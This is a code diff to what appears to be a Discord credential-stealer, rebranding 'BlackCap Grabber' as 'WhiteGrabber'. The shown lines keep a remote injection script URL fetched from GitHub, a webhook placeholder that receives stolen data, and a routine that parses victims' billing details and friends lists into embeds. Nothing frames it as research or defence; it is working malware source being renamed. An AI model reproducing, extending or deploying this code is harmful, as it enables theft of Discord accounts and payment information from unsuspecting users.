@@ -15,7 +15,7 @@ var config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/KSCHdsc/WhiteGrabber-Inject/main/index.js",
     webhook: "%WEBHOOK%",
     Filter: {
         "urls": [
@@ -57,8 +57,8 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "BlackCap Grabber",
-        avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+        username: "WhiteGrabber Grabber",
+        avatar_url: "https://raw.githubusercontent.com/KSCHdsc/WhiteGrabber-Assets/main/WhiteGrabber%20(2).png",
         content: "",
         embeds: [{
             title: title,
@@ -365,7 +365,7 @@ const FirstTime = async () => {
 
             var Billings = parseBilling(billing)
             var Friends = parseFriends(friends)
-            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/WhiteGrabber%20(2).png"
             if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
 
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
